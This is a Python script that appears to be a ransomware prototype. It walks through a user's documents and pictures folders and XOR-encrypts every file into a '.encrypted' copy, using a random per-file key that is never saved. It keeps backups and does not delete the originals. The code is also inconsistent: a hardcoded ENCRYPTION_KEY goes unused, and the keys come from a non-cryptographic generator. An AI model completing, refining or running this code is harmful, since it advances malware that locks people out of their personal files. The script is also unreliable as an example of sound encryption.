import os
import random
import string

# Configuration
TARGET_DIRS = ["/home/user/documents", "/home/user/pictures"]  # Replace with target paths
ENCRYPTION_KEY = "supersecretkey123"  # Replace with actual key generation logic
BACKUP_DIR = "/backup"  # Directory to store backups before encryption

def generate_random_string(length=10):
    """Generate a random string of given length."""
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def encrypt_file(file_path):
    """Encrypt a file using XOR cipher with a random key."""
    try:
        # Create backup first
        backup_path = os.path.join(BACKUP_DIR, f"{os.path.basename(file_path)}.bak")
        if not os.path.exists(os.path.dirname(backup_path)):
            os.makedirs(os.path.dirname(backup_path))
        with open(file_path, 'rb') as f:
            data = f.read()
        with open(backup_path, 'wb') as f:
            f.write(data)

        # Encrypt file
        key = generate_random_string()
        encrypted_data = bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data)])
        with open(file_path + ".encrypted", 'wb') as f:
            f.write(encrypted_data)
        
        print(f"[+] Encrypted: {file_path}")
        return True
    except Exception as e:
        print(f"[-] Error encrypting {file_path}: {e}")
        return False

def main():
    # Ensure backup directory exists
    if not os.path.exists(BACKUP_DIR):
        os.makedirs(BACKUP_DIR)

    # Traverse target directories
    for target_dir in TARGET_DIRS:
        for root, _, files in os.walk(target_dir):
            for filename in files:
                file_path = os.path.join(root, filename)
                encrypt_file(file_path)

if __name__ == "__main__":
    main()